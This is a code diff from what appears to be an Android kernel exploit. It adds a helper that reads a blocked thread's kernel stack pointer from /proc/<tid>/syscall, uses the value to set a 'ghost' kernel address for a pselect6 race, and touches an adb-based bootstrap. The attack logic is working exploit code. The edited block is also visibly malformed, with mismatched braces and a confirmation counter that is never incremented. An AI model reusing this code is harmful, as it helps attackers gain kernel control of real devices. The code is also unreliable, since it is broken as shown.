@@ -342,6 +342,30 @@ void *owner_thread(void *arg __attribute__((unused))) {
   for (;;) sleep(1);
 }
 
+/* Read the blocked-in-select kernel SP of tid from /proc/<tid>/syscall
+ * ("nr a0..a5 sp pc ..."; token[7]=sp). Returns 0 and stores sp on
+ * success, -1 otherwise. */
+static int tid_spin_getsp(int tid, uintptr_t *sp_out) {
+  char path[96], buf[160];
+  snprintf(path, sizeof(path), "/proc/self/task/%d/syscall", tid);
+  int fd = open(path, O_RDONLY);
+  if (fd < 0) return -1;
+  ssize_t n = read(fd, buf, sizeof(buf) - 1);
+  close(fd);
+  if (n <= 0) return -1;
+  buf[n] = 0;
+  if (strtol(buf, NULL, 10) != __NR_pselect6) return -1;
+  char *save = NULL;
+  char *tok = strtok_r(buf, " ", &save);
+  for (int t = 0; t < 7 && tok; t++)
+    tok = strtok_r(NULL, " ", &save);
+  if (!tok) return -1;
+  unsigned long sp = strtoul(tok, NULL, 16);
+  if (sp <= 0x2000) return -1;
+  *sp_out = (uintptr_t)sp;
+  return 0;
+}
+
 void *consumer_thread(void *arg __attribute__((unused))) {
   disable_rseq_for_thread();
   pin_to_core(CONSUMER_CORE);
@@ -349,6 +373,19 @@ void *consumer_thread(void *arg __attribute__((unused))) {
   while (!atomic_load(&punch_consume_stop)) {
     int seq = atomic_load(&punch_consume_go);
     if (seq == 0 || seq == seen) {
+      /* PRE-ARM SP DISCOVERY (delivery gate): while unarmed (the spin
+       * window), poll the waiter's blocked-in-select SP so g_ghost_kva
+       * is published BEFORE the final stamps — the handoff arms this
+       * thread only after the last re-stamp, so the SP must come from
+       * here, not the guard. */
+      if (!g_ghost_kva && tid_spin_getsp(atomic_load(&waiter_tid),
+                                         &g_ghost_kva) == 0) {
+        long delta = env_int_range("PSELECT_GHOST_DELTA", 0, -0x2000,
+                                   0x2000);
+        g_ghost_kva = (uintptr_t)((long)g_ghost_kva + delta);
+        pr_info("spin-SP ghost=%lx (delta=%ld)\n",
+                (unsigned long)g_ghost_kva, delta);
+      }
       __asm__ volatile("yield" ::: "memory");
       continue;
     }
@@ -377,26 +414,13 @@ void *consumer_thread(void *arg __attribute__((unused))) {
           int conf = 0;
           int need = env_int_range("PSELECT_WCHAN_CONFIRM", 3, 1, 3);
           for (int c = 0; c < need; c++) {
-            char path[96], buf[160];
-            snprintf(path, sizeof(path), "/proc/self/task/%d/syscall", tid);
-            int fd = open(path, O_RDONLY);
-            if (fd < 0) break;
-            ssize_t n = read(fd, buf, sizeof(buf) - 1);
-            close(fd);
-            if (n <= 0) break;
-            buf[n] = 0;
-            if (strtol(buf, NULL, 10) != __NR_pselect6) break;
-            snprintf(path, sizeof(path), "/proc/self/task/%d/wchan", tid);
-            fd = open(path, O_RDONLY);
-            if (fd < 0) break;
-            n = read(fd, buf, sizeof(buf) - 1);
-            close(fd);
-            if (n <= 0) break;
-            buf[n] = 0;
-            if (strncmp(buf, "do_select", 9) != 0) break;
-            conf++;
-          }
-          if (conf == need) {
+              uintptr_t sp = 0;
+              if (tid_spin_getsp(tid, &sp) == 0) {
+                long delta = env_int_range("PSELECT_GHOST_DELTA", 0,
+                                           -0x2000, 0x2000);
+                g_ghost_kva = (uintptr_t)((long)sp + delta);
+              }
+            }          if (conf == need) {
             long long started = g_select_start_us;
             if (started > 0) {
               struct timespec gnow;
@@ -4468,7 +4492,7 @@ static int run_bootstrap(void) {
   int ret = run_write1_only();
   if (ret != 0) return ret;
 
-  /* Wait for adb TCP — read the actual port from system property */
+  
   int adb_port = 5555;
   char port_buf[32] = {};
   read_first_line("/data/local/tmp/a/adb_port", port_buf, sizeof(port_buf));
